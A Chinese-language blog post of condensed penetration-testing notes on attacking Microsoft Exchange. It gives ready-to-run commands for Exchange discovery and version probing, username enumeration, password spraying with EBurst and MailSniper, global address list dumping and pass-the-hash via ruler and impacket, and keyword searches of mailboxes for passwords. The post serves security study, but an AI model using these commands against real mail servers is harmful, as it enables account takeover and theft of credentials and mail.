<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Exchange 攻击专题 | Starven's Blog</title><meta name="author" content="Starven"><meta name="copyright" content="Starven"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="仅是对原文的阅读理解cv浓缩 攻击向量 若没有任何凭据  12341.泄露信息  2.爆破邮箱账户  3.配合钓鱼进行中继  4.RCE   有普通凭据  12345671.导出邮箱列表2.搜索自身敏感邮件3.搜索共享文件4.搜索域信息5.攻击 Outlook 客户端6.配合 SSRF 进行中继7.RCE   有高权限凭据  121.全局邮件管理2.攻击域管  一、无任何权限的攻击向量1. 探测发">
<meta property="og:type" content="article">
<meta property="og:title" content="Exchange 攻击专题">
<meta property="og:url" content="https://starven-l.github.io/2025/07/14/Exchange-%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/index.html">
<meta property="og:site_name" content="Starven&#39;s Blog">
<meta property="og:description" content="仅是对原文的阅读理解cv浓缩 攻击向量 若没有任何凭据  12341.泄露信息  2.爆破邮箱账户  3.配合钓鱼进行中继  4.RCE   有普通凭据  12345671.导出邮箱列表2.搜索自身敏感邮件3.搜索共享文件4.搜索域信息5.攻击 Outlook 客户端6.配合 SSRF 进行中继7.RCE   有高权限凭据  121.全局邮件管理2.攻击域管  一、无任何权限的攻击向量1. 探测发">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim">
<meta property="article:published_time" content="2025-07-14T15:39:37.000Z">
<meta property="article:modified_time" content="2025-07-14T15:40:42.399Z">
<meta property="article:author" content="Starven">
<meta property="article:tag" content="域渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Exchange 攻击专题",
  "url": "https://starven-l.github.io/2025/07/14/Exchange-%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/",
  "image": "https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim",
  "datePublished": "2025-07-14T15:39:37.000Z",
  "dateModified": "2025-07-14T15:40:42.399Z",
  "author": [
    {
      "@type": "Person",
      "name": "Starven",
      "url": "https://starven-l.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://starven-l.github.io/2025/07/14/Exchange-%E6%94%BB%E5%87%BB%E4%B8%93%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Exchange 攻击专题',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-archive"></i><span> 文档</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://starven-images-1321067152.cos.ap-chengdu.myqcloud.com/images/avatar.jpg?imageSlim" alt="Logo"><span class="site-name">Starven's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Exchange 攻击专题</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/search/"><i class="fa-fw fas fa-search"></i><span> 搜索</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-archive"></i><span> 文档</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Exchange 攻击专题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-14T15:39:37.000Z" title="发表于 2025-07-14 23:39:37">2025-07-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-14T15:40:42.399Z" title="更新于 2025-07-14 23:40:42">2025-07-14</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>仅是对原文的阅读理解cv浓缩</p>
<h1 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h1><ul>
<li>若没有任何凭据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.泄露信息  </span><br><span class="line">2.爆破邮箱账户  </span><br><span class="line">3.配合钓鱼进行中继  </span><br><span class="line">4.RCE</span><br></pre></td></tr></table></figure>

<ul>
<li>有普通凭据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.导出邮箱列表</span><br><span class="line">2.搜索自身敏感邮件</span><br><span class="line">3.搜索共享文件</span><br><span class="line">4.搜索域信息</span><br><span class="line">5.攻击 Outlook 客户端</span><br><span class="line">6.配合 SSRF 进行中继</span><br><span class="line">7.RCE</span><br></pre></td></tr></table></figure>

<ul>
<li>有高权限凭据</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.全局邮件管理</span><br><span class="line">2.攻击域管</span><br></pre></td></tr></table></figure>

<h1 id="一、无任何权限的攻击向量"><a href="#一、无任何权限的攻击向量" class="headerlink" title="一、无任何权限的攻击向量"></a>一、无任何权限的攻击向量</h1><h2 id="1-探测发现Exchange邮件服务"><a href="#1-探测发现Exchange邮件服务" class="headerlink" title="1. 探测发现Exchange邮件服务"></a>1. 探测发现Exchange邮件服务</h2><ul>
<li>域内定位</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">通过SPN：</span><br><span class="line">setspn -Q exchange*/*</span><br><span class="line"></span><br><span class="line">通过DNS：</span><br><span class="line">nslookup -type=srv _autodiscover._tcp</span><br><span class="line"></span><br><span class="line">通过LDAP查SPN：</span><br><span class="line">AdFind.exe -h 域控ip -b &quot;DC=example,DC=com&quot; -f &quot;|(ServicePrincipalName=exchange*)(ServicePrincipalName=smtp*)(ServicePrincipalName=imap*)(ServicePrincipalName=pop*)&quot; ServicePrincipalName</span><br><span class="line"></span><br><span class="line">通过LDAP查Exchange Servers组所有成员：</span><br><span class="line">AdFind.exe -h 域控ip -b &quot;DC=example,DC=com&quot; -bit -f (memberof:INCHAIN:=&quot;CN=Exchange Servers,OU=Microsoft Exchange Security Groups,DC=example,DC=com&quot;) memberof</span><br></pre></td></tr></table></figure>

<ul>
<li>域外</li>
</ul>
<p>传统的端口扫描发现 Exchange：<code>25,465,587,2525,80,443</code>，扫 web titlte 时一定要跟随跳转，默认会跳转到 <code>https://exchange/owa</code>，此时 title 显示的是 Outlook</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">443：客户端连接CAS服务器（web，Outlook）</span><br><span class="line"></span><br><span class="line">80：有时候通过80端口访问owa,会进行重定向到443</span><br><span class="line"></span><br><span class="line">IMAP协议端口：</span><br><span class="line"></span><br><span class="line">         143：非加密端口</span><br><span class="line"></span><br><span class="line">         993：加密端口</span><br><span class="line"></span><br><span class="line">pop3协议端口：</span><br><span class="line"></span><br><span class="line">         110：非加密端口</span><br><span class="line"></span><br><span class="line">         995：加密端口</span><br><span class="line"></span><br><span class="line">身份验证端口：</span><br><span class="line"></span><br><span class="line">         587加密身份验证</span><br><span class="line"></span><br><span class="line">          25：非加密身份验证（发送接收邮件端口）</span><br><span class="line"></span><br><span class="line">50636端口：exchange的边缘服务器和AD，前端服务器进行同步使用。</span><br></pre></td></tr></table></figure>

<h2 id="2-版本判定"><a href="#2-版本判定" class="headerlink" title="2. 版本判定"></a>2. 版本判定</h2><ul>
<li>&#x2F;owa 接口 &#x2F;owa&#x2F;service接口会有响应头X-OWA-Version，会返回类似 <code>15.1.2375.7</code> 这种完整的版本号</li>
</ul>
<p>然后再去 Exchange Server 内部版本号和发布日期对比具体的发布版本，可以查询到 CU 版本和安全更新版本</p>
<ul>
<li>&#x2F;owa网页源码</li>
</ul>
<p>前端源码会有 <code>/owa/auth/15.1.2375/themes/resources/xxxx</code> 类似的路径，其中 <code>15.1.2375</code> 是部分内部版本号</p>
<p>老版本 Exchange 会返回完整内部版本号</p>
<p>新版本只会返回部分内部版本号</p>
<p>而部分的内部版本号只能确定 CU 版本，无法确定安全更新版本</p>
<ul>
<li>得到部分版本号后：爆破&#x2F;ecp接口</li>
</ul>
<p>可以爆破路径 <code>/ecp/&lt;version here&gt;/exporttool/</code> 获得完整内部版本号</p>
<p>只需爆破最后一位版本号即可。如果存在，返回 200，否则返回 404。</p>
<ul>
<li><code>/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application</code> 接口下载的xml含完整内部版本号</li>
</ul>
<h2 id="3-爆破邮箱账户"><a href="#3-爆破邮箱账户" class="headerlink" title="3. 爆破邮箱账户"></a>3. 爆破邮箱账户</h2><p>步骤：</p>
<ol>
<li>确定AD域名</li>
<li>爆破用户名</li>
<li>密码喷洒攻击</li>
</ol>
<p>注意：不是每个域用户都有Exchange邮箱服务，这是需要Exchange管理员给予用户手动添加的</p>
<p>如果密码爆破成功后出现 <code>未找到 EXAMPLE\\domain_admin 的邮箱。</code> 的提示，则说明该账户未开通邮箱，但这个账户也是有效的域用户账户</p>
<p>Exchange邮件服务不同接口支持的认证协议也不同：</p>
<ul>
<li><code>/ecp</code>、<code>/owa</code> 接口是直接面向用户的 GUI 页面，通过传统的 HTTP 认证方式进行认证。在没有验证码或者可以绕过的情况下，可以直接用burp爆破</li>
<li><code>/Autodiscover</code>、<code>/Rpc</code>、<code>/EWS</code>、<code>/OAB</code>、<code>/Mapi</code> 是用于各种应用程序与 Exchange 通信的接口，通过 HTTP NTLM 进行认证。Burp 无法爆破，可以通过 ruler、MailSniper、apt34 泄露的工具 Jason、SprayingToolkit、EBurst 等工具进行爆破。</li>
</ul>
<p>由于这些接口支持 NTLM 认证，因此也能 pth 域用户账户。甚至，<code>/rpc</code> 接口的 <code>[MS-OXNSPI]</code> 协议还能 pth 域机器账户。</p>
<h3 id="（1）获取AD域名"><a href="#（1）获取AD域名" class="headerlink" title="（1）获取AD域名"></a>（1）获取AD域名</h3><p>这玩意其实ipconfig &#x2F;all 或者 net time &#x2F;domain 就行了不用原文说的那么复杂通过解析返回的ntlmssp包来获取信息</p>
<h3 id="（2）用户名爆破"><a href="#（2）用户名爆破" class="headerlink" title="（2）用户名爆破"></a>（2）用户名爆破</h3><p>原理：Exchange 存在基于时间的用户名枚举问题，Exchange 2016 版本的表现为：爆破到真实存在的域用户（无论是否开通邮箱账户）时，其<strong>响应开始接收时间</strong>会更短（不是完整响应时间）</p>
<p>字典：经过传统的邮箱收集加上一定的高频用户名形成用户名字典后，需要为字典设置三种格式：<code>domain\\username</code>、<code>username</code>、<code>user@domain</code>Exchange 管理员可以任意配置使用一种或多种格式，因此爆破的时候最好带上所有格式。</p>
<p>Burp爆破：刚才说了没有验证码或者可以绕过的话，直接对&#x2F;ecp和&#x2F;owa接口爆破，找一下响应时间更短的就是域用户</p>
<p>脚本爆破：<code>MailSniper.ps1 支持 /owa、/Microsoft-Server-ActiveSync</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Invoke-UsernameHarvestEAS -ExchHostname Exchange邮服IP/域名 -Domain island.com -UserList username.txt -Threads 1 -OutFile owa-valid-users.txt</span><br><span class="line"></span><br><span class="line">Invoke-UsernameHarvestOWA -ExchHostname Exchange邮服IP/域名-Domain island.com -UserList username.txt -Threads 1 -OutFile owa-valid-users.txt</span><br><span class="line"></span><br><span class="line">解释一下ps这俩函数接口：</span><br><span class="line">1. Invoke-UsernameHarvestOWA：</span><br><span class="line">利用 /owa/auth.owa 登录页面发起 POST 请求</span><br><span class="line">当用户名存在但密码错误时 → 返回 &quot;status&quot;:&quot;locked&quot; 或 &quot;status&quot;:&quot;error&quot;</span><br><span class="line">当用户名不存在 → 返回 &quot;status&quot;:&quot;invalidUserName&quot; 等</span><br><span class="line">根据响应内容判断用户是否存在</span><br><span class="line"></span><br><span class="line">2. Invoke-UsernameHarvestEAS：</span><br><span class="line">利用 /Microsoft-Server-ActiveSync 端点模拟连接</span><br><span class="line">对存在用户的请求返回 401 Unauthorized（需要密码）</span><br><span class="line">对不存在的用户 → 直接返回 404 或不同结构的响应</span><br><span class="line">也是根据响应差异枚举用户是否存在</span><br></pre></td></tr></table></figure>

<p>SMTP协议枚举【不完全可靠】：邮箱存在会返回 250，不存在返回 500</p>
<p>但如果目标邮服配置了 <code>Catch-all</code> 邮箱，则所有发往目标邮服的无效邮箱都会被 <code>Catch-all</code> 邮箱接收，即无论邮箱是否存在都会返回 250。</p>
<h3 id="（3）密码喷洒"><a href="#（3）密码喷洒" class="headerlink" title="（3）密码喷洒"></a>（3）密码喷洒</h3><p>在获得 AD 域名和存在的用户名后，可以通过多个接口爆破 Exchange</p>
<p>还是可以burp爆破&#x2F;owa接口和&#x2F;ecp接口</p>
<p>还有脚本爆破通过Eburst和MailSniper</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># EBurst 最推荐</span><br><span class="line"># EBurst 支持所有接口爆破，-C 检查目标开放的接口，再指定存活接口爆破。建议 /ews 或默认</span><br><span class="line">python2 EBurst.py -d 192.168.60.116 -L username.txt -p 123456 -T 10</span><br><span class="line">python2 EBurst.py -d 192.168.60.116 -C</span><br><span class="line"></span><br><span class="line"># MailSniper.ps1 仅支持 /OWA /EWS /Microsoft-Server-ActiveSync 接口，推荐 /ews</span><br><span class="line">Invoke-PasswordSprayEWS -ExchHostname 192.168.60.116 -UserList .\\username.txt -Password ZS@123qwe -Threads 10 -OutFile owa-sprayed-creds.txt</span><br><span class="line">Invoke-PasswordSprayOWA -ExchHostname 192.168.60.116 -UserList .\\username.txt -Password ZS@123qwe -Threads 10 -OutFile owa-sprayed-creds.txt</span><br><span class="line">Invoke-PasswordSprayEAS -ExchHostname 192.168.60.116 -UserList .\\username.txt -Password ZS@123qwe -Threads 10 -OutFile owa-sprayed-creds.txt</span><br></pre></td></tr></table></figure>

<h1 id="二、有普通邮箱账户权限的攻击向量"><a href="#二、有普通邮箱账户权限的攻击向量" class="headerlink" title="二、有普通邮箱账户权限的攻击向量"></a>二、有普通邮箱账户权限的攻击向量</h1><p>获得普通邮箱账户权限后，攻击者可以进行大量的信息收集</p>
<h2 id="1-获取全部邮箱地址"><a href="#1-获取全部邮箱地址" class="headerlink" title="1. 获取全部邮箱地址"></a>1. 获取全部邮箱地址</h2><p>Exchange 存在一个全局地址列表（GAL），所有邮箱地址都位列其中。获得任一邮箱用户凭证后，可以多种方式获取 GAL，即能用于后续钓鱼，也能用于扩大爆破范围</p>
<ul>
<li>利用&#x2F;owa接口：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">登录 /owa 后可以查看所有人的邮箱地址，配合 Burp 导出即可</span><br></pre></td></tr></table></figure>

<ul>
<li>利用mapi接口：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个工具主要通过 /mapi 模拟 Outlook 通信，通过 /Autodiscover 实现与 Outlook 类似的自动配置能力，ruler 会自动发现 Exchange 域内的域名并访问。但如果攻击者处于域外的话，会因为 DNS 无法解析导致攻击失败，需要攻击者手动配置域名解析</span><br><span class="line"></span><br><span class="line">ruler-win64.exe --insecure --url &lt;https://192.168.60.116/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com -u zhangsan -p ZS@123qwe --verbose --debug abk list</span><br><span class="line"></span><br><span class="line">ruler-win64.exe --insecure --url &lt;https://192.168.60.116/autodiscover/autodiscover.xml&gt; --email zhangsan@island.com -u zhangsan --hash 82b6413f42426e0b40e6d0674eb16299 --verbose --debug abk list</span><br></pre></td></tr></table></figure>

<ul>
<li>利用EWS接口：通过 <code>/EWS</code> 指定搜索条件获取 GAL，类似于爆破，很慢。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MailSniper.ps1:</span><br><span class="line">Get-GlobalAddressList -ExchHostname 192.168.60.116 -username island.com\\lisi -password LS@123qwe -OutFile global-address-list.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>利用OAB接口：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/OAB 本身就是地址集合列表的副本。首先需要构造包访问 /Autodiscover 获取具体的 /OAB/xxx/oab.xml，然后下载其中的 .lzx 文件，最后通过 oabextract 解析后得到其中的 SMTP 地址信息。</span><br><span class="line"></span><br><span class="line">顺便一提，/Autodiscover 除了会返回 oab.xml 地址外，还会返回域控地址。</span><br></pre></td></tr></table></figure>

<ul>
<li>利用rpc接口：通过 <code>/RPC</code> 接口配合 <code>[MS-OXNSPI]</code> 和 <code>[MS-NSPI]</code> 协议直接获取 AD 中的地址簿信息，最快。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">impacket</span><br><span class="line">python3 exchanger.py island.com/zhangsan@192.168.60.116 -hashes :82b6413f42426e0b40e6d0674eb16299 nspi list-tables</span><br><span class="line">python3 exchanger.py island.com/zhangsan:ZS@123qwe@192.168.60.116 nspi list-tables -count</span><br><span class="line">python3 exchanger.py island.com/zhangsan:ZS@123qwe@192.168.60.116 nspi dump-tables -guid dd5c6c6e-f050-4fef-b91f-4ac4cb16d5cb</span><br></pre></td></tr></table></figure>

<h2 id="2-获取自身邮箱邮件"><a href="#2-获取自身邮箱邮件" class="headerlink" title="2. 获取自身邮箱邮件"></a>2. 获取自身邮箱邮件</h2><p>如果爆出了密码，直接 web端走 <code>/OWA</code> 登录查看</p>
<p>如果获得了 hash，可以 pth 后 <code>Invoke-SelfSearch</code> 走 <code>/ews</code> 查看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># MailSniper.ps1</span><br><span class="line"># 指定 lisi 的账密查询 lisi 的所有邮件</span><br><span class="line">Invoke-SelfSearch -Folder all -Mailbox lisi@island.com -ExchHostname win2012-ex2016.island.com -MailsPerUser 500 -Terms &quot;*password*&quot;,&quot;*creds*&quot;,&quot;*credentials*&quot;,&quot;*测试*&quot;,&quot;*密码*&quot;,&quot;*拓扑*&quot;,&quot;*运维*&quot;,&quot;*VPN*&quot;,&quot;*账号*&quot; -OutputCsv lisi-email-search.csv -Remote -User island.com\\lisi -Password LS@123qwe</span><br><span class="line"></span><br><span class="line"># 用当前会话的默认凭证搜索 zhangsan 的所有邮件</span><br><span class="line"># 配合 mimikatz 实现 pth 后搜索</span><br><span class="line">Invoke-SelfSearch -Folder all -Mailbox zhangsan@island.com -ExchHostname win2012-ex2016.island.com -MailsPerUser 500 -Terms &quot;*password*&quot;,&quot;*creds*&quot;,&quot;*credentials*&quot;,&quot;*测试*&quot;,&quot;*密码*&quot;,&quot;*拓扑*&quot;,&quot;*运维*&quot;,&quot;*VPN*&quot;,&quot;*账号*&quot; -OutputCsv zhangsan-email-search.csv</span><br></pre></td></tr></table></figure>

<h2 id="3-搜索域内信息"><a href="#3-搜索域内信息" class="headerlink" title="3. 搜索域内信息"></a>3. 搜索域内信息</h2><p>这里来了解两种协议<code>[MS-OXNSPI]</code> 和 <code>[MS-NSPI]</code></p>
<p><code>[MS-OXNSPI]</code> 和 <code>[MS-NSPI]</code> 协议都是用于获取地址簿数据的，区别是前者用于客户端与 Exchange 通信，后者用于 Exchange 与域控通信</p>
<p>因此，<code>[MS-NSPI]</code> 也是继 LDAP 和 <code>[MS-DRSR]</code>（也称为 DcSync 和 DRSUAPI）之后第三个访问 Active Directory 的网络协议。</p>
<p><code>/rpc</code> 接口支持各种远程调用，其中包括 <code>[MS-OXNSPI]</code> 协议，该协议用于客户端从 Exchange 服务器获取 OAB 数据。Exchange 本身并不存储地址簿数据，而是通过 <code>[MS-NSPI]</code> 协议与域控通信，访问 Active Directory 来获取地址簿数据。</p>
<p>遗憾的是，<code>[MS-OXNSPI]</code> 和 <code>[MS-NSPI]</code> 并不能获取全部的 Active Directory 属性，而是 X.500 空间集的属性。而且，根据微软文档描述，这两个协议仅用于获取 AD（Active Directory） 中的地址簿数据，而不能访问整个 AD 条目。不过研究人员发现，可以通过爆破 DNT（Distinguished Name Tags）的方式遍历全部 AD 条目，但是依然无法获取额外的 AD 属性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 需要修改 exchanger.py，否则保存的时候可能会报解码错误。</span><br><span class="line">class Exchanger:</span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line">    def set_output_file(self, filename):</span><br><span class="line">        self.__outputFileName = filename</span><br><span class="line">        # self.__outputFd = open(self.__outputFileName, &#x27;w+&#x27;)</span><br><span class="line">        self.__outputFd = open(self.__outputFileName, &#x27;w+&#x27;, encoding=&quot;utf-8&quot;)  # 添加 encoding=&quot;utf-8&quot;</span><br><span class="line"></span><br><span class="line"># impacket 使用 exchanger.py 执行 DNT 枚举（NSPI）</span><br><span class="line">python3 exchanger.py island.com/zhangsan:ZS@123qwe@192.168.60.116 nspi dnt-lookup -start-dnt 0 -stop-dnt 100000 -lookup-type FULL -output-file dnt.txt</span><br></pre></td></tr></table></figure>

<p>在实战中，如果已经在域内了，这个手法的使用意义不大，因为 <code>[MS-NSPI]</code> 返回的 X.500 属性不像 AD 中的那么全，不能等同于 LDAP。但是如果在域外或者是直接攻击互联网上的 Exchange，可以搜索 <code>objectSid</code> 来发现域内机器账户，配合 <code>/Microsoft-Server-ActiveSync</code> 遍历主机名查询共享文件。</p>
